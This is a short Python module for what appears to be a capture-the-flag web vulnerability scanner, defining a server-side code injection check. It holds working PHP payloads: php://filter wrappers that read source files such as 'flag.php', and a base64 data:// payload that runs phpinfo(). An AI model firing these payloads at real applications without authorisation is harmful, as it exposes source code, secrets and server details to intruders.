from Scanner import Scanner

class ServerSideCodeInjectionScanner(Scanner):
    className = 'Server Side Code Injection'
    payloads = ['php://filter/convert.quoted-printable-encode/resource=flag',
            'php://filter/convert.quoted-printable-encode/resource=flag.php',
            'php://filter/convert.quoted-printable-encode/resource=%s',
            'php://filter/convert.quoted-printable-encode/resource=%s.php',
            'data://text/plain;base64,PD8gZWNobyI8P3BocD0wQSI7cGhwaW5mbygpO2RpZSgpOz8%2b']
    payloads.extend(payload + '%%0' for payload in payloads[:])
    testSignature = fixedSignature = '<?php=0A'

    def loadPayload(self, payload, target):
        if payload.find('%s') > -1:
            testPayload = ''.join(target['action'].split('/')[-1].split('.')[:-1])
            return (payload % testPayload, payload % testPayload, self.testSignature)
        else:
            return (payload, payload, self.fixedSignature)
